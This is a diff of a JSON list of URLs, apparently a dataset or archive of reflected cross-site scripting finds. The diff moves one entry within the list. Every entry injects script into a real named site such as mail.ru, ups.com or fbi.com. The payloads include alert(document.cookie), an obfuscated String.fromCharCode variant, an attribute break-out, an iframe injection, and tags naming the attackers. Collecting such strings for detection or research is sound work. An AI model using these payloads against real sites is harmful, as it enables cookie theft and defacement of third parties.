@@ -1,3 +1,4 @@
+{"url": "http://touch.tv.mail.ru/%22%3E%3Cscript%3Ealert%28%22XSS_BY_C37HUN%22%29%3C/script%3E"},
 {"url": "http://www.m86security.com/support/search/SiteSearch.asp?query=Search...&Product=%27%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E&Page=2"},
 {"url": "https://portailrh.ac-bordeaux.fr/login/ct_logon_mixte.jsp?CT_ORIG_URL=%2Farena%2F%22%3E%3Cscript%3Ealert%281337%29%3C/script%3E%3Ciframe%20src=http://xssed.com%3E%3C/iframe%3E"},
 {"url": "http://www.ups.com/content/us/en/bussol/browse/cat/wireless.html?loc=en_US%22%3E%27;alert%28String.fromCharCode%2870,%20108,%20117,%20120,%2032,%2049,%2051,%2051,%2055,%2032,%2082,%2048,%2048,%2084%29%29//\\%27;alert%28String.fromCharCode%2870,%20108,%20117,%20120,%2032,%2049,%2051,%2051,%2055,%2032,%2082,%2048,%2048,%2084%29%29//%22;alert%28String.fromCharCode%2870,%20108,%20117,%20120,%2032,%2049,%2051,%2051,%2055,%2032,%2082,%2048,%2048,%2084%29%29//\\%22;alert%28String.fromCharCode%2870,%20108,%20117,%20120,%2032,%2049,%2051,%2051,%2055,%2032,%2082,%2048,%2048,%2084%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2870,%20108,%20117,%20120,%2032,%2049,%2051,%2051,%2055,%2032,%2082,%2048,%2048,%2084%29%29%3C/SCRIPT%3E&viewID=categoryView&contentID=ct1_sol_cat_wireless&WT.svl=PNRO_L1"},
@@ -12,7 +13,6 @@
 {"url": "http://ged.latribune.fr/zetasearch/recherche/index.jsp?DN_SEARCH=%27%22%3E%3C/script%3E%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E"},
 {"url": "http://www.fbi.com/?not_found=%3Ch1%3EXSS%20BY%20Mr.M4D3RS%3C/h1%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E"},
 {"url": "http://english.sinopec.com/investor_center/historyQuery.jsp?d=%22%20onmouseover%3dalert%28document.cookie%29%20abc%3d%22&dayend=23&daystart=23&doSearch=true&endDate=2012-03-06&gid=1&monthend=3&monthstart=3&range=1&startDate=2000-10-19&Submit2=search&yearend=1967&yearstart=1967"},
-{"url": "http://touch.tv.mail.ru/%22%3E%3Cscript%3Ealert%28%22XSS_BY_C37HUN%22%29%3C/script%3E"},
 {"url": "http://touch.afisha.mail.ru/%22%3E%3Cscript%3Ealert%28%22XSS_BY_C37HUN%22%29%3C/script%3E"},
 {"url": "http://www.elle.fr/action/login?ReturnUrl=http://www.elle.fr/recherche/recherche-globale/(searchText)/\"/><script>alert('XSS By M4ke')</script>"},
 {"url": "http://library.leeds.ac.uk/site/scripts/google_results.php?q=bentley&stylesheet=%22%3E%3Cscript%3Ealert%28%27raVen%27%29%3C/script%3E&collections=libcms"},
